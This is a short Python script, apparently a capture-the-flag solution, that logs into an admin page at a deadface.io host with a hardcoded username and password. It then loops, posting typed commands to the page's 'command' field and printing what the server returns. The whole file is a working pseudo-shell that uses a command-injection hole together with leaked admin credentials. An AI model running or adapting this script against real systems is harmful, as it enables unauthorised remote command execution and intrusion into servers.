import requests
from bs4 import BeautifulSoup
import html

url = "https://trendytrove.deadface.io/"
login = "login.php"
admin = "admin.php"

username = "admin"
password = "1bPEt&3r0B#4hQ"

session = requests.Session()

login_data = {
    "username": username,
    "password": password
}

session.post(url + login, data=login_data)

while True:
    command = input("Enter a command: ")

    admin_data = {
        "command": command,
        "check_status": ""
    }
    resp = session.post(url + admin, data=admin_data)

    soup = BeautifulSoup(resp.text, "html.parser")

    pre_tags = soup.find_all("pre")

    for pre in pre_tags:
        decoded_text = html.unescape(pre.text)
        print(decoded_text)